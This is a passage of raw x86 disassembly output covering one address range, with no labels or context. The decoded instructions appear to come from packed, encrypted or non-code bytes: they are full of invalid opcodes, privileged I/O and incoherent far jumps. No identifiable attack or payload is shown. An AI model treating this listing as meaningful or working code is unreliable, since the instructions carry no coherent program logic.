  41b2a2:	pop    ebx
  41b2a3:	daa    
  41b2a4:	cmp    esp,ebx
  41b2a6:	pop    ss
  41b2a7:	adc    DWORD PTR [edx],ecx
  41b2a9:	cs inc ebx
  41b2ab:	and    bl,bl
  41b2ad:	popf   
  41b2ae:	and    BYTE PTR [esi-0x70],dl
  41b2b1:	sbb    BYTE PTR [esi],bl
  41b2b3:	not    BYTE PTR [esi+esi*1+0x31]
  41b2b7:	fcom   DWORD PTR [edi]
  41b2b9:	repz cmc 
  41b2bb:	jmp    0x5a2e:0x1ffeeb3c
  41b2c2:	bnd jg 0x41b32c
  41b2c5:	xchg   BYTE PTR [ebp+0x56],ch
  41b2c8:	mov    bl,0x73
  41b2ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2cb:	out    0x87,eax
  41b2cd:	jmp    0x41b279
  41b2cf:	pop    ds
  41b2d0:	test   eax,0xdb57c8c5
  41b2d5:	lods   al,BYTE PTR ds:[esi]
  41b2d6:	or     DWORD PTR [esi-0x1fd8decb],esi
  41b2dc:	jne    0x41b279
  41b2de:	les    edx,FWORD PTR [edi+0x73fb4a3b]
  41b2e4:	cmp    dl,ch
  41b2e6:	test   al,0xab
  41b2e8:	ret    0x583d
  41b2eb:	or     ah,BYTE PTR [esi+0xa]
  41b2ee:	xor    DWORD PTR [ebx+0x63],esp
  41b2f1:	repz mov eax,0x536a0a1c
  41b2f7:	sub    esp,DWORD PTR [ebp-0x73]
  41b2fa:	bound  ebp,QWORD PTR [edx]
  41b2fc:	jb     0x41b334
  41b2fe:	push   eax
  41b2ff:	add    BYTE PTR [ebx],dh
  41b301:	adc    al,BYTE PTR [edx]
  41b303:	in     al,dx
  41b304:	stc    
  41b305:	push   eax
  41b306:	push   ebx
  41b307:	add    DWORD PTR [eax+eiz*2-0x379f5266],esi
  41b30e:	mov    ecx,0x9e69aaed
  41b313:	dec    edx
  41b314:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b315:	mov    ebp,esi
  41b317:	xchg   ebp,eax
  41b318:	or     DWORD PTR [ecx-0x70],esi
  41b31b:	fisttp QWORD PTR [esp+eiz*8]
  41b31e:	mov    dl,0x9b
  41b320:	mov    WORD PTR [ecx-0x28],ss
  41b323:	jmp    0x17e0a509
  41b328:	inc    edx
  41b329:	pop    bx
  41b32b:	cmp    eax,0xcf7f16dd
  41b330:	cwde   
  41b331:	adc    al,0x9a
  41b333:	xor    BYTE PTR [ecx+0x46804e72],bh
  41b339:	repnz push es
  41b33b:	(bad)  
  41b33c:	fisttp WORD PTR [edx-0x61]
  41b33f:	inc    esp
  41b340:	mov    ebx,0x98b2058d
  41b345:	mov    ds,ebx
  41b347:	mov    ebp,0xd2bda387
  41b34c:	stos   BYTE PTR es:[edi],al
  41b34d:	jmp    0xa458:0xc5db089c
  41b354:	push   eax
  41b355:	and    DWORD PTR [edi-0x32],ebp
  41b358:	jp     0x41b3b2
  41b35a:	outs   dx,DWORD PTR ds:[esi]
  41b35b:	leave  
  41b35c:	pop    esi
  41b35d:	mov    ebx,0xd1f97425
  41b362:	xchg   edi,eax
  41b363:	rol    BYTE PTR [esi+eiz*1+0x5e],0xf7
  41b368:	ins    BYTE PTR es:[edi],dx
  41b369:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b36a:	jge    0x41b3a7
  41b36c:	pop    ss
  41b36d:	scas   eax,DWORD PTR es:[edi]
  41b36e:	push   0x11
  41b370:	mov    eax,ds:0x8d23b01f
  41b375:	shr    ah,cl
  41b377:	(bad)  
  41b379:	xor    al,BYTE PTR [ecx+0x36958c1a]
  41b37f:	dec    esi
  41b380:	and    al,0xfa
  41b382:	ret    
  41b383:	jb     0x41b324
  41b385:	shr    DWORD PTR [eax-0x25f697ab],1
  41b38b:	pusha  
  41b38c:	or     eax,0x89c7e65b
  41b391:	push   0xffffffc1
  41b393:	cmp    al,0x29
  41b395:	call   DWORD PTR [ecx]
  41b397:	cmp    al,0xb4
  41b399:	sbb    ch,BYTE PTR [edi+0x2923e9f5]
  41b39f:	xlat   BYTE PTR ds:[ebx]
  41b3a0:	sub    BYTE PTR [ebx+0x56],dh
  41b3a3:	sub    DWORD PTR [ecx],esp
  41b3a5:	int    0x3f
  41b3a7:	mov    bh,0xea
  41b3a9:	cmc    
  41b3aa:	data16 lahf 
  41b3ac:	mov    al,0x4f
  41b3ae:	or     DWORD PTR [esi-0x6b],0x56
  41b3b2:	inc    esp
  41b3b3:	mov    eax,0x95d3ed9c
  41b3b8:	in     al,0xb9
  41b3ba:	js     0x41b3c5
  41b3bc:	pop    ds
  41b3bd:	mov    BYTE PTR [ecx+0x4bf51eb0],ah
  41b3c3:	dec    ebp
  41b3c4:	adc    ebp,0x280efcc4
  41b3ca:	jge    0x41b390
  41b3cc:	adc    al,0x93
  41b3ce:	mov    dh,0x54
  41b3d0:	mov    esp,0x3a12c797
  41b3d5:	in     al,dx
  41b3d6:	xlat   BYTE PTR ds:[ebx]
  41b3d7:	jcxz   0x41b3bb
  41b3da:	in     eax,dx
  41b3db:	jno    0x41b3e8
  41b3dd:	jg     0x41b382
  41b3df:	cwde   
  41b3e0:	data16 into 
  41b3e2:	xor    al,0x88
  41b3e4:	xor    al,0xe
  41b3e6:	sbb    eax,0xf4318cce
  41b3eb:	or     ecx,DWORD PTR [esi+0x4b]
  41b3ee:	or     esp,DWORD PTR [ebp-0x13]
  41b3f1:	cmp    bl,BYTE PTR [edx]
  41b3f3:	pop    ebx
  41b3f4:	add    BYTE PTR [eax],0x4e
  41b3f7:	ficomp DWORD PTR [eax+esi*4]
  41b3fa:	dec    ecx
  41b3fb:	(bad)  
  41b3fc:	stc    
  41b3fd:	lods   eax,DWORD PTR ds:[esi]
  41b3fe:	xor    dl,BYTE PTR [esi-0x33]
  41b401:	xor    BYTE PTR [ebp-0x2a291cb1],cl
  41b407:	lock pop edi
  41b409:	jecxz  0x41b3c7
  41b40b:	std    
  41b40c:	in     eax,0x35
  41b40e:	jl     0x41b3fc
  41b410:	cld    
  41b411:	sbb    cl,ch
  41b413:	and    ah,cl
  41b415:	int    0x95
  41b417:	pop    esi
  41b418:	jl     0x41b3e8
  41b41a:	aas    
  41b41b:	mov    cl,dl
  41b41d:	sbb    al,0x41
  41b41f:	or     eax,0xb5223f
  41b424:	outs   dx,DWORD PTR ds:[esi]
  41b425:	pop    ebp
  41b426:	push   edi
  41b427:	rol    DWORD PTR [esi],0x3d
  41b42a:	mov    ecx,gs
  41b42c:	lea    edi,[edx-0x10e9ce45]
  41b432:	and    cl,BYTE PTR [ebp+eiz*8+0x24031b72]
  41b439:	clc    
  41b43a:	mov    bh,0x90
  41b43c:	xor    dh,BYTE PTR [edx]
  41b43e:	mov    al,ds:0x36ab2507
  41b443:	xor    dl,BYTE PTR [ebx-0x1a]
  41b446:	aas    
  41b447:	stos   BYTE PTR es:[edi],al
  41b448:	cmp    al,0x4c
  41b44a:	bound  esi,QWORD PTR [eax+ebx*4-0x38]
  41b44e:	stos   DWORD PTR es:[edi],eax
  41b44f:	push   ecx
  41b450:	shl    dl,1
  41b452:	or     ebp,ecx
  41b454:	jmp    0x41b4c5
  41b456:	sbb    DWORD PTR [esi+0x3f679419],edi
  41b45c:	popf   
  41b45d:	rol    bh,0x9
  41b460:	leave  
  41b461:	cmp    bh,bh
  41b463:	popf   
  41b464:	fdiv   QWORD PTR [esi]
  41b466:	cmp    al,0xf5
  41b468:	mov    ch,0x62
  41b46a:	retf   
  41b46b:	or     BYTE PTR [ebx-0x4f21514c],0x37
  41b472:	sub    al,0x1f
  41b474:	test   cl,dh
  41b476:	inc    ecx
  41b477:	xchg   edi,eax
  41b478:	xchg   ebp,eax
  41b479:	or     eax,0xbefa3bca
  41b47e:	sti    
  41b47f:	adc    eax,0x30cd31df
  41b484:	sub    BYTE PTR [ebp+0x45914ed5],ah
  41b48a:	mov    esi,0x24a9f948
  41b48f:	inc    edi
  41b490:	outs   dx,DWORD PTR ds:[esi]
  41b491:	dec    ebx
  41b492:	leave  
  41b493:	mul    DWORD PTR [ebx+0x427788f4]
  41b499:	sbb    DWORD PTR [eax-0x2d13b7dd],edx
  41b49f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4a0:	outs   dx,DWORD PTR ds:[esi]
  41b4a1:	jo     0x41b4c1
  41b4a3:	push   eax
  41b4a4:	rcl    al,0x3b
  41b4a7:	push   ebp
  41b4a8:	pop    ss
  41b4a9:	ss inc edx
  41b4ab:	mov    ch,0x6f
  41b4ad:	push   0x781e63a0
  41b4b2:	jno    0x41b4e4
  41b4b4:	xchg   esi,eax
  41b4b5:	rcl    BYTE PTR [edx+0xc2f3606],1
  41b4bb:	pop    edx
  41b4bc:	test   al,ch
  41b4be:	push   edx
  41b4bf:	pop    edx
  41b4c0:	sub    BYTE PTR [esi+esi*1],ah
  41b4c3:	cld    
  41b4c4:	dec    edx
  41b4c5:	test   eax,0xbb220f5d
  41b4ca:	push   esi
  41b4cb:	mov    edi,0x7cffd7d8
  41b4d0:	inc    ecx
  41b4d1:	test   al,0x81
  41b4d3:	pop    esp
  41b4d4:	push   ecx
  41b4d5:	test   ebp,edi
  41b4d7:	inc    esi
  41b4d9:	ds retf 
  41b4db:	fistp  DWORD PTR [edi]
  41b4dd:	icebp  
  41b4de:	mov    ebp,0xf4697f26
  41b4e3:	add    edi,DWORD PTR [ebx*1-0x319a05fe]
  41b4ea:	mov    esp,0x94eb36f1
  41b4ef:	cwde   
  41b4f0:	repnz shr esp,cl
  41b4f3:	push   esi
  41b4f4:	mov    fs,WORD PTR [esi+0x571558f8]
  41b4fa:	push   ebp
  41b4fb:	sbb    BYTE PTR [ecx+0x74],0x70
  41b4ff:	adc    dl,bl
  41b501:	out    dx,al
  41b502:	mov    al,ds:0x9b440616
  41b507:	mov    dl,0x5f
  41b509:	or     BYTE PTR [edx+0x2856e21f],ah
  41b50f:	int    0xad
  41b511:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b512:	push   es
  41b513:	shl    DWORD PTR [ebx+0x55def308],cl
  41b519:	call   FWORD PTR [eax]
  41b51b:	sbb    esp,DWORD PTR [edx]
  41b51d:	jo     0x41b4ff
  41b51f:	push   ss
  41b520:	mov    ebx,0x151e5e5b
  41b525:	xor    ebx,esi
  41b527:	sti    
  41b528:	xor    BYTE PTR [eax+0x47f08799],ch
  41b52e:	out    dx,al
  41b52f:	jg     0x41b538
  41b531:	xor    BYTE PTR [edx-0x59],dl
  41b534:	lahf   
  41b535:	add    cl,BYTE PTR [edi+0x13]
  41b538:	pusha  
  41b539:	fst    st(0)
  41b53b:	or     edi,DWORD PTR [ebx+0x6bda8f6c]
  41b541:	adc    al,0xb7
  41b543:	imul   edx,ebx,0xffffffe6
  41b546:	add    eax,0x41722ba3
  41b54b:	push   0xc914689d
  41b550:	leave  
  41b551:	mov    BYTE PTR [edx+0x4442e66e],dh
  41b557:	ret    0x3bc5
  41b55a:	in     eax,0x4a
  41b55c:	loop   0x41b5b0
  41b55e:	prefetcht2 BYTE PTR [ebx-0x7c]
  41b562:	pop    eax
  41b563:	aam    0x93
  41b565:	aaa    
  41b566:	sbb    ah,al
  41b568:	in     eax,dx
  41b569:	das    
  41b56a:	xchg   ecx,eax
  41b56b:	mov    ah,0x1f
  41b56d:	and    esp,DWORD PTR [ebx+esi*1-0x73]
  41b571:	jmp    0xc4f4:0x562b2c28
  41b578:	mov    al,0x4
  41b57a:	or     al,0x1c
  41b57c:	dec    eax
  41b57d:	scas   al,BYTE PTR es:[edi]
  41b57e:	xlat   BYTE PTR ds:[ebx]
  41b57f:	mov    esi,ds
  41b581:	lock test al,0x32
  41b584:	push   ebp
  41b585:	mov    ebp,0xad4080ae
  41b58a:	test   eax,0xd433f259
  41b58f:	lahf   
  41b590:	cmp    eax,0xcf62ca25
  41b595:	ins    DWORD PTR es:[edi],dx
  41b596:	neg    esp
  41b598:	imul   ebp,DWORD PTR [ecx-0x72ac4883],0xfffffff7
  41b59f:	mov    eax,0x1e189dc3
  41b5a4:	mov    bh,0xff
  41b5a6:	jl     0x41b624
  41b5a8:	pop    edx
  41b5a9:	fsub   QWORD PTR [ebx+0x1c]
  41b5ac:	mov    ecx,DWORD PTR ss:[edi]
  41b5af:	sbb    esp,eax
  41b5b1:	lea    ecx,[eax+0x3701e5c1]
  41b5b7:	les    ecx,FWORD PTR [edx+0x44dee3ba]
  41b5bd:	int3   
  41b5be:	adc    cl,BYTE PTR [edx]
  41b5c0:	and    al,0xd7
  41b5c3:	imul   BYTE PTR [edx]
  41b5c5:	xor    eax,0x4258499
  41b5ca:	or     al,0xb6
  41b5cc:	sbb    al,0xf1
  41b5ce:	add    esi,DWORD PTR [edi+0x23f34837]
  41b5d4:	push   esi
  41b5d5:	inc    esp
  41b5d6:	dec    ecx
  41b5d7:	adc    ebx,DWORD PTR [esi+0x61a85725]
  41b5dd:	sbb    edi,DWORD PTR [ebp+0x1c]
  41b5e0:	sbb    BYTE PTR [ebp+eiz*2-0x7ad2999b],bh
  41b5e7:	dec    edx
  41b5e8:	arpl   WORD PTR gs:[edi],dx
  41b5eb:	call   0x565d:0x51114e6
  41b5f2:	pop    esi
  41b5f3:	imul   esi,DWORD PTR [edx-0x12],0xffffff81
  41b5f7:	jb     0x41b59c
  41b5f9:	add    DWORD PTR [ebx+0x77749d21],ebp
  41b5ff:	xor    al,0x22
  41b601:	aaa    
  41b602:	xchg   ebp,eax
  41b603:	add    DWORD PTR [esi+0x6c3dd96b],esi
  41b609:	sub    DWORD PTR [ecx+0x47],0x89b8df31
  41b610:	and    DWORD PTR [ebx],edi
  41b612:	sub    al,0xc9
  41b614:	repnz and DWORD PTR [ebp+0x35],edi
  41b618:	(bad)  
  41b619:	(bad)  
  41b61a:	mov    ?,WORD PTR [eax]
  41b61c:	loopne 0x41b62c
  41b61e:	cdq    
  41b61f:	jne    0x41b64f
  41b621:	dec    edx
  41b622:	lock lods al,BYTE PTR ds:[esi]
  41b624:	retf   0x673e
  41b627:	outs   dx,DWORD PTR ds:[esi]
  41b628:	ds cmp esi,esi
  41b62b:	hlt    
  41b62c:	jb     0x41b656
  41b62e:	ret    
  41b62f:	pop    ebp
  41b630:	jmp    0x55f6:0x80af6335
  41b637:	push   ecx
  41b638:	lods   eax,DWORD PTR ds:[esi]
  41b639:	xchg   DWORD PTR [ecx],ebx
  41b63b:	pop    ss
  41b63c:	dec    esp
  41b63d:	mov    esi,0xc455b739
  41b642:	sub    DWORD PTR [ebp+edi*2-0x9],0x37
  41b647:	retf   0x69c1
  41b64a:	in     al,0x52
  41b64c:	aam    0x3f
  41b64e:	outs   dx,DWORD PTR ds:[esi]
  41b64f:	mov    edi,0x715a4aae
  41b654:	push   edi
  41b655:	jb     0x41b689
  41b657:	cmp    DWORD PTR [ecx],0x53
  41b65a:	not    DWORD PTR ds:0x70da3f37
  41b660:	mov    cl,0x74
  41b662:	add    eax,0x1a03f3ca
  41b667:	inc    ebx
  41b668:	xor    eax,0xdcbd3f30
  41b66d:	and    BYTE PTR [eax],al
  41b66f:	jnp    0x41b6e3
  41b671:	aas    
  41b672:	stos   DWORD PTR es:[edi],eax
  41b673:	lds    ebp,FWORD PTR [ecx-0x17e730f4]
  41b679:	clts   
  41b67b:	or     BYTE PTR [edi-0x306d050a],bl
  41b681:	ror    DWORD PTR [eax+ebp*2+0x3],0x4
  41b686:	icebp  
  41b687:	repz bound esi,QWORD PTR [edi-0x500f5a9e]
  41b68e:	or     DWORD PTR ds:[ecx+edx*4+0x16],eax
  41b693:	jbe    0x41b696
  41b695:	out    0xc1,al
  41b697:	daa    
  41b698:	lea    edi,[ebp+0x2ca80f2d]
  41b69e:	inc    esi
  41b69f:	pop    esp
  41b6a0:	cmp    DWORD PTR [edx+0x3f],esi
  41b6a3:	and    ah,cl
  41b6a5:	or     eax,0xc4febe5d
  41b6aa:	aaa    
  41b6ab:	mul    ah
  41b6ad:	sub    eax,0x4b6065d5
  41b6b2:	(bad)  [ebp+0xd07f1d6]
  41b6b8:	jmp    0x41b680
  41b6ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6bb:	out    dx,al
  41b6bc:	rcl    BYTE PTR [ebp-0x13c6228f],0x4b
  41b6c3:	xchg   ebp,eax
  41b6c4:	and    DWORD PTR [edx-0x566f1c39],esi
  41b6ca:	lahf   
  41b6cb:	leave  
  41b6cc:	push   es
  41b6cd:	inc    ebx
  41b6ce:	int3   
  41b6cf:	ror    DWORD PTR [ebx+0x1f],0x8f
  41b6d3:	mov    dh,0x4a
  41b6d5:	iret   
  41b6d6:	mov    al,0xb8
  41b6d8:	inc    ebp
  41b6d9:	stc    
  41b6da:	cmp    edx,DWORD PTR [ecx]
  41b6dc:	aas    
  41b6dd:	or     edi,DWORD PTR [eax+0x2eb918e7]
  41b6e3:	stc    
  41b6e4:	gs ins DWORD PTR es:[edi],dx
  41b6e6:	and    ecx,eax
  41b6e8:	jg     0x41b75c
  41b6ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6eb:	push   0x9aa3b144
  41b6f0:	and    al,0x82
  41b6f2:	mov    al,BYTE PTR [eax+0x5f]
  41b6f5:	inc    esi
  41b6f6:	std    
  41b6f7:	(bad)  
  41b6f8:	in     al,dx
  41b6f9:	or     al,0xca
  41b6fb:	push   es
  41b6fc:	inc    ebp
  41b6fd:	dec    eax
  41b6fe:	fs inc eax
  41b700:	in     al,0x1b
  41b702:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b703:	out    0x79,eax
  41b705:	jecxz  0x41b6a2
  41b707:	inc    eax
  41b708:	dec    edi
  41b709:	mov    ebp,0xa02d3c62
  41b70e:	pop    ebp
  41b70f:	dec    ecx
  41b710:	sub    BYTE PTR [ecx+0x1c],al
  41b713:	mov    ecx,0x5f4d0499
  41b718:	or     DWORD PTR [edi+ecx*4],edi
  41b71b:	adc    DWORD PTR [ebx+0x1ab23002],esi
  41b721:	in     al,dx
  41b722:	xchg   ebx,eax
  41b723:	dec    ecx
  41b724:	jge    0x41b6d2
  41b726:	popf   
  41b727:	int3   
  41b728:	(bad)  
  41b729:	jns    0x41b6b6
  41b72b:	in     al,0xd7
  41b72d:	adc    eax,0xaabaa8f0
  41b732:	out    0xa8,al
  41b734:	(bad)  
  41b735:	and    cl,bl
  41b737:	add    edi,edx
  41b739:	mov    dh,0x5e
  41b73b:	jne    0x41b706
  41b73d:	pop    ss
  41b73e:	push   ecx
  41b73f:	(bad)  
  41b741:	mov    bl,BYTE PTR [eax+esi*2-0x2b]
  41b745:	shl    BYTE PTR [esi-0x31],1
  41b748:	hlt    
  41b749:	sub    BYTE PTR [ecx-0x20],0xc1
  41b74d:	sahf   
  41b74e:	adc    bl,bl
  41b750:	xchg   DWORD PTR [ecx-0xd9e95d8],eax
  41b756:	sub    al,0xdc
  41b758:	sahf   
  41b759:	imul   edi,eax,0x60
  41b75c:	jg     0x41b7a9
  41b75e:	cmp    al,0x63
  41b760:	inc    ebx
  41b761:	adc    cl,BYTE PTR [ecx-0x15599f1f]
  41b767:	imul   esi,DWORD PTR [ecx-0x5e],0x2c9814f4
  41b76e:	das    
  41b76f:	and    dl,BYTE PTR [esi]
  41b771:	mov    WORD PTR [edi+esi*1-0x49],fs
  41b775:	shl    BYTE PTR [ebp-0x1a63b87a],0x9d
  41b77c:	sbb    al,0xba
  41b77e:	dec    esp
  41b77f:	pop    ds
  41b780:	cli    
  41b781:	mov    al,0x27
  41b783:	call   0x10ce:0x4b050a04
  41b78a:	pop    edx
  41b78b:	sar    ch,cl
  41b78d:	outs   dx,DWORD PTR ds:[si]
  41b78f:	mov    ah,BYTE PTR [ebx-0x4ed966d6]
  41b795:	mov    BYTE PTR [esi],bh
  41b797:	jb     0x41b7d5
  41b799:	dec    edx
  41b79a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b79b:	inc    ebx
  41b79c:	sub    eax,eax
  41b79e:	add    eax,0xaa757709
  41b7a3:	inc    eax
  41b7a4:	mov    eax,ds:0xd0ea4c31
  41b7a9:	call   0x7b89a714
  41b7ae:	jle    0x41b79c
  41b7b0:	add    eax,0x6fa13e7e
  41b7b5:	mov    BYTE PTR [ebx],cl
  41b7b7:	sbb    BYTE PTR [ecx+eax*1+0x613cc047],dh
  41b7be:	daa    
  41b7bf:	mov    edi,edi
  41b7c1:	add    ebx,ecx
  41b7c3:	repz pop edx
  41b7c5:	daa    
  41b7c6:	dec    esp
  41b7c7:	sbb    eax,0xeaa707d9
  41b7cc:	xlat   BYTE PTR ds:[ebx]
  41b7cd:	popf   
  41b7ce:	inc    BYTE PTR ds:0x93482fb1
  41b7d4:	pop    es
  41b7d5:	jae    0x41b834
  41b7d7:	push   ecx
  41b7d8:	mov    al,0x8e
  41b7da:	nop
  41b7db:	test   DWORD PTR [edi-0x44],edx
  41b7de:	inc    edx
  41b7df:	cmp    eax,0x6539c3b4
  41b7e4:	mov    esi,0x5cfd0474
  41b7e9:	data16 sbb al,0xa2
  41b7ec:	sub    DWORD PTR [edx-0x53ee938a],ebx
  41b7f2:	stos   DWORD PTR es:[edi],eax
  41b7f3:	mov    ds:0x272ef7dd,eax
  41b7f8:	test   al,0x78
  41b7fa:	les    eax,FWORD PTR [eax+0x4b]
  41b7fd:	and    al,0xd
  41b7ff:	adc    DWORD PTR [eax],esp
  41b801:	test   DWORD PTR [ecx],eax
  41b803:	xchg   edi,eax
  41b804:	xchg   esp,eax
  41b805:	popf   
  41b806:	ret    0xeb2e
  41b809:	mov    eax,edx
  41b80b:	popa   
  41b80c:	push   esi
  41b80d:	out    0xf1,eax
  41b80f:	mov    BYTE PTR [ecx],bl
  41b811:	xchg   ebx,eax
  41b812:	test   DWORD PTR cs:[esp+ecx*8-0x3a],edx
  41b817:	jno    0x41b7d8
  41b819:	push   es
  41b81a:	sbb    esp,DWORD PTR [eax-0x51]
  41b81d:	and    al,0x45
  41b81f:	inc    eax
  41b820:	mov    cl,0xa7
  41b822:	fstp   QWORD PTR [edi+0x6e58c131]
  41b828:	pusha  
  41b829:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b82a:	xchg   edi,eax
  41b82b:	call   0xaebf:0x8190bf14
  41b832:	jbe    0x41b7c0
  41b834:	fsubr  st(0),st
  41b836:	jg     0x41b866
  41b838:	cmp    eax,DWORD PTR [esi-0x78]
  41b83b:	inc    edx
  41b83c:	nop
  41b83d:	pushf  
  41b83e:	rcr    DWORD PTR ds:0x1433c382,cl
  41b844:	stc    
  41b845:	adc    ecx,esi
  41b847:	(bad)  
  41b848:	cli    
  41b849:	lods   al,BYTE PTR ds:[esi]
  41b84a:	adc    al,0xe4
  41b84c:	pop    eax
  41b84d:	push   ds
  41b84e:	loop   0x41b7f1
  41b850:	push   esi
  41b851:	and    al,0x42
  41b853:	in     al,0x1d
  41b855:	mov    dl,dl
  41b857:	add    edi,0xb00c17ae
  41b85d:	adc    al,0x68
  41b85f:	xor    eax,0x808e19b3
  41b864:	pop    ecx
  41b865:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b866:	js     0x41b8da
  41b868:	fwait
  41b869:	dec    ebx
  41b86a:	(bad)  
  41b86b:	repz sub eax,0xdc1101e2
  41b871:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b872:	lock frstor [bx+di]
  41b876:	out    0x1c,al
  41b878:	(bad)  
  41b879:	sbb    DWORD PTR [ecx-0x1d8bc584],edx
  41b87f:	jnp    0x41b84e
  41b881:	jne    0x41b8e7
  41b883:	inc    eax
  41b884:	xor    ecx,esp
  41b886:	imul   ecx,DWORD PTR ds:[ecx+0x55db8010],0xffffffe8
  41b88e:	in     al,dx
  41b88f:	xor    edx,ebx
  41b891:	mov    ch,0xfd
  41b893:	sar    DWORD PTR [ebx],cl
  41b895:	not    BYTE PTR [ecx+0x67823bce]
  41b89b:	sbb    ebp,DWORD PTR [ecx-0x62]
  41b89e:	loopne 0x41b854
  41b8a0:	fistp  DWORD PTR [esi-0x2fcd9de4]
  41b8a6:	ss push 0xffffff87
  41b8a9:	and    BYTE PTR [edx-0x2e],bh
  41b8ac:	dec    eax
  41b8ad:	push   ecx
  41b8ae:	dec    esi
  41b8af:	jg     0x41b8d8
  41b8b1:	ins    BYTE PTR es:[edi],dx
  41b8b2:	sub    eax,0x4c2da4d2
  41b8b7:	loope  0x41b8f1
  41b8b9:	jne    0x41b903
  41b8bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8bc:	cmp    DWORD PTR [ebp-0x2a],0xffffffb8
  41b8c0:	cmp    esi,DWORD PTR [eax+0x56]
  41b8c3:	mov    WORD PTR [eax],?
  41b8c5:	ss adc eax,0x365f6867
  41b8cb:	jl     0x41b91e
  41b8cd:	jnp    0x41b873
  41b8cf:	call   0x3537:0x668ff27f
  41b8d6:	push   ebx
  41b8d7:	push   0xf435e57b
  41b8dc:	mov    ebp,0xcaeb46bb
  41b8e1:	fsubr  DWORD PTR [edx-0xfb7798e]
  41b8e7:	outs   dx,DWORD PTR ds:[esi]
  41b8e8:	xor    dh,BYTE PTR [ecx*4+0x790eb95e]
  41b8ef:	repnz push ds
  41b8f1:	push   edi
  41b8f2:	and    dh,cl
  41b8f4:	add    ah,BYTE PTR [edx+ebx*8]
  41b8f7:	push   cs
  41b8f8:	add    eax,0x23a16456
  41b8fd:	mov    cl,0x45
  41b8ff:	in     al,dx
  41b900:	sub    BYTE PTR [ebx-0x68],al
  41b903:	js     0x41b8d5
  41b905:	cs push ecx
  41b907:	mov    bh,0x8c
  41b909:	js     0x41b925
  41b90b:	fist   WORD PTR [eax]
  41b90d:	jbe    0x41b89f
  41b90f:	dec    esi
  41b910:	sbb    BYTE PTR [edx+ecx*8-0x6ec060ec],ch
  41b917:	xchg   edx,eax
  41b918:	adc    eax,eax
  41b91a:	push   ss
  41b91b:	jne    0x41b90c
  41b91d:	xchg   edx,eax
  41b91e:	(bad)  
  41b91f:	fbstp  TBYTE PTR [ebx-0x12e9b590]
  41b925:	mov    ds:0xa6ba6a64,eax
  41b92a:	dec    ecx
  41b92b:	push   esp
  41b92c:	ins    DWORD PTR es:[edi],dx
  41b92d:	xor    bl,BYTE PTR [ebx]
  41b92f:	sahf   
  41b930:	fsubr  QWORD PTR [esi]
  41b932:	lock fwait
  41b934:	je     0x41b8f3
  41b936:	lods   eax,DWORD PTR ds:[esi]
  41b937:	xchg   edi,eax
  41b938:	inc    ebp
  41b939:	sar    BYTE PTR [edx],0xc0
  41b93c:	aaa    
  41b93d:	dec    esi
  41b93e:	inc    ebp
  41b93f:	aaa    
  41b940:	lock out 0xea,al
  41b943:	mov    ch,0x54
  41b945:	leave  
  41b946:	ja     0x41b9aa
  41b948:	test   DWORD PTR [ebp-0xf],esp
  41b94b:	add    esi,DWORD PTR [esi+0x6ffb2bfe]
  41b951:	push   es
  41b952:	ret    0xe0b0
  41b955:	mov    edi,0xc962622a
  41b95a:	xor    eax,0x950ba70b
  41b95f:	xlat   BYTE PTR ds:[ebx]
  41b960:	sub    DWORD PTR [esi-0x7f6dc2bf],ecx
  41b966:	xchg   esi,eax
  41b967:	inc    edx
  41b968:	push   ds
  41b969:	dec    esi
  41b96a:	mov    edi,0x41ee1560
  41b96f:	mov    al,ds:0xdb4e4fba
  41b974:	sti    
  41b975:	xchg   ebp,eax
  41b976:	mov    WORD PTR [ebx],gs
  41b978:	mov    al,0xd5
  41b97a:	in     al,dx
  41b97b:	pop    edx
  41b97c:	out    0xcf,eax
  41b97e:	pushf  
  41b97f:	sbb    ebx,ebx
  41b981:	xlat   BYTE PTR ds:[ebx]
  41b982:	cmc    
  41b983:	repz lock in eax,0xa3
  41b987:	fsubr  QWORD PTR [esi]
  41b989:	arpl   WORD PTR [ebx-0x7797a258],di
  41b98f:	clc    
  41b990:	mov    bl,0x4b
  41b992:	adc    BYTE PTR [ebx+0x2b],al
  41b995:	add    eax,esp
  41b997:	dec    esi
  41b998:	dec    eax
  41b999:	(bad)  
  41b99a:	mov    al,0xb9
  41b99c:	adc    esp,DWORD PTR [edi]
  41b99e:	xchg   edx,eax
  41b99f:	rcr    BYTE PTR [eax+0x2],0xe8
  41b9a3:	push   ds
  41b9a4:	in     eax,0x91
  41b9a6:	cmp    al,BYTE PTR [edi-0x7e45ec6b]
  41b9ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9ad:	jmp    0x41b99e
  41b9af:	ret    
  41b9b0:	cli    
  41b9b1:	mov    ds:0x1d5dc071,al
  41b9b6:	adc    bl,BYTE PTR [esi-0x5aea0220]
  41b9bc:	mov    WORD PTR [edi],?
  41b9be:	pop    edx
  41b9bf:	fs in  al,dx
  41b9c1:	ins    BYTE PTR es:[edi],dx
  41b9c2:	stos   BYTE PTR es:[edi],al
  41b9c3:	xchg   ecx,eax
  41b9c4:	xor    ecx,DWORD PTR [ebx+0x2e]
  41b9c7:	jge    0x41b9f8
  41b9c9:	jecxz  0x41ba20
  41b9cb:	inc    ecx
  41b9cc:	mov    al,ah
  41b9ce:	xor    al,0xbd
  41b9d0:	(bad)  
  41b9d1:	stos   BYTE PTR es:[edi],al
  41b9d2:	int3   
  41b9d3:	aad    0xb2
  41b9d5:	aaa    
  41b9d6:	jb     0x41b95b
  41b9d8:	fnsave [eax]
  41b9da:	(bad)  
  41b9db:	sbb    BYTE PTR [ecx],ah
  41b9dd:	mov    ecx,0xd08e854e
  41b9e2:	push   ds
  41b9e3:	ins    BYTE PTR es:[edi],dx
  41b9e4:	pushf  
  41b9e5:	inc    edx
  41b9e6:	mov    ebp,0xede188ae
  41b9eb:	or     al,0x29
  41b9ed:	clc    
